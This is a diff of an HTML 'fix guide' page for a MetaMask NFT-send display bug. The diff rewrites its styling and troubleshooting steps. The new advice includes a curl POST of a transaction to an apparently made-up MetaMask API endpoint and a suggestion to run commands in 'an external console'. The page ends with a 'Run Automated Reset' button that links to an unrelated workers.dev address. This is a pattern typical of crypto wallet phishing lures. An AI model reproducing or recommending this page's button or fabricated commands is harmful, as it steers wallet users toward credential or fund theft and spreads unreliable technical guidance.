@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0f111a;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,29 +42,31 @@
 <h1>Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</h1>
 <h2>Symptom</h2>
 <ul>
-<li>When attempting to send an NFT using the Metamask extension, the activity display shows the NFT's ID as if it were the amount being sent, instead of displaying the correct amount (usually 1, since NFTs are unique).</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem experience a bug when sending NFTs, where the activity log displays the NFT's ID as if it were the amount being sent, instead of showing the actual NFT being transferred.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a bug in the Metamask extension's activity display logic, where it incorrectly interprets and displays the NFT's ID as the transaction amount.</li>
+<li>The error occurs due to a misinterpretation of the data type in the transaction payload, where the NFT's unique identifier is mistakenly treated as a numerical value representing the amount.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the transaction details on the blockchain explorer to verify the correct amount.</li>
-<li>Use the <code>eth_getTransactionByHash</code> RPC method to retrieve the transaction details and verify the amount.</li>
-<li>Update the Metamask extension to the latest version using the following command:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Check the transaction details on a blockchain explorer to verify the correct NFT transfer.</li>
+<li>Use the Metamask API to manually construct and send the NFT transfer transaction.</li>
+<li>Utilize a custom script to parse the transaction data and correct the display:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>@metamask/core
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://api.metamask.io/transactions<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;from&quot;: &quot;0x...&quot;,&quot;to&quot;: &quot;0x...&quot;,&quot;value&quot;: &quot;1&quot;,&quot;gas&quot;: &quot;20000&quot;,&quot;gasPrice&quot;: &quot;20000000000&quot;}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and troubleshooting.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Metamask extension installed and configured</li>
-<li>Ethereum wallet set up with a valid account</li>
-<li>NFTs available in the wallet for testing</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-importing-a-custom-token-does-not-work.html">Metamask Extension Bug Importing A Custom Token Does Not Work</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed and configured
+* Ethereum wallet with sufficient funds
+* Basic understanding of JSON and API requests
+Consider using an external console, such as a terminal or command prompt, to execute these commands.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reconnect</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-account-discovery-and-syncs-error-for-so.html">Metamask Extension Bug Account Discovery And Syncs Error For Social Login Import Users</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
